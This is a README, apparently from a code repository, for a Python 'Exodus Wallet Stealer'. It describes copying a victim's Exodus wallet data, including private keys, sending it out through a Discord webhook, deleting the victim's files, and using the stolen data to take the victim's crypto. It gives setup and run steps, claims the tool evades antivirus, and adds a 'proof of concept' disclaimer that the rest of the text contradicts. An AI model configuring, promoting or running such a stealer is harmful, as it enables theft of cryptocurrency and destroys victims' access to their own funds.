# Exodus Wallet Stealer

Working Exodus Wallet Stealer to steal Exodus wallets, private keys, public keys and crypto in general, the stealer downloads a backup of the exodus app data and then sends it to you via a discord webhook, once you recieve the webhook message the files are deleted so the wallet can no longer be accessed by the user, you can then download the files and drag and drop them into your appdata and reload your exodus.

After doing this you will have full access to all there stuff including private keys, you could then send and recieve crypto through that account.

The program once compiled properly is not detected by Anti-Virus at all and this makes it very dangerous malware.

## Video
https://user-images.githubusercontent.com/122122838/228079770-cb0463dc-4afe-4e29-89d5-148389b54730.mp4

## Setup
Download the project files then follow the instructions below.

Open `stealer.py` and change this line:
```bash
Discord_Webhook_Client.send_file("WEBHOOK")
```
Remove **WEBHOOK** and add your Discord webhook URL.
    
## Run the program
You can run the stealer by doing the following command:
```bash
python stealer.py
OR 
python3 stealer.py
```

I recommend that you compile this if you wanted to actually use it and this is what cybercrimals would do however I am not gonna show how you can do this as this project is just a proof of concept and supposed to help fight against malware not make it spread more.

## NOTE:
This malware is supposed to explain and show how the malware would operate in a manor that allows the user to run it themselves without causing danage, I do not condone spreading or compiling with the intention to spread this malware and will not and have not shown how to compile it properly and have made it so it is not a complete version of malware. 
